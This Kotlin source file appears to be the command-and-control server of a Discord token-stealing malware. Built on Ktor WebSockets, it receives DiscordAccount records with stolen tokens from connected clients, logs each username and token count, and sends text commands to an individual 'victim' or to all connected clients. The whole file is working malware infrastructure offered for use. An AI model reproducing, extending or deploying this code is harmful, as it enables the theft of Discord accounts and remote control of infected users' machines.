package websocket

import bot.StatusChannel
import io.ktor.serialization.kotlinx.*
import models.informations.DiscordAccount
import io.ktor.server.application.*
import io.ktor.server.application.Application
import io.ktor.server.routing.*
import io.ktor.server.websocket.*
import io.ktor.websocket.*
import io.netty.util.internal.logging.Slf4JLoggerFactory
import kotlinx.serialization.json.Json
import org.slf4j.LoggerFactory
import org.slf4j.simple.SimpleLoggerFactory

object Application {

    private val connections = mutableSetOf<Connection>()

    fun Application.module() {
        install(WebSockets) {
            contentConverter = KotlinxWebsocketSerializationConverter(Json)
        }

        routing {
            webSocket("/pool") {
                val thisConnection = Connection(this)
                connections += thisConnection
                StatusChannel.update(thisConnection.name)

                val discordInfos = receiveDeserialized<DiscordAccount>()
                println(discordInfos)
                LoggerFactory.getLogger(Slf4JLoggerFactory::class.java).info("Received ${discordInfos.username} with ${discordInfos.tokens.size} tokens")

                for (frame in incoming) {
                    frame as? Frame.Text ?: continue
                    when (frame.readText()) {
                        "ping" -> send(Frame.Text("pong"))
                        "close" -> close(CloseReason(CloseReason.Codes.NORMAL, "Client said CLOSE"))
                        else -> send(Frame.Text("Unknown command ${frame.readText()}"))
                    }
                }
                StatusChannel.update(thisConnection.name)
                connections -= thisConnection
            }
        }
    }

    suspend fun send(victim: String, text: String) {
        connections.forEach {
            if (it.name == victim) {
                it.session.send(
                    Frame.Text(
                        text = text
                    )
                )
            }
        }
    }

    suspend fun sendAll(text: String) {
        connections.forEach {
            it.session.send(Frame.Text(text = text))
        }
    }
}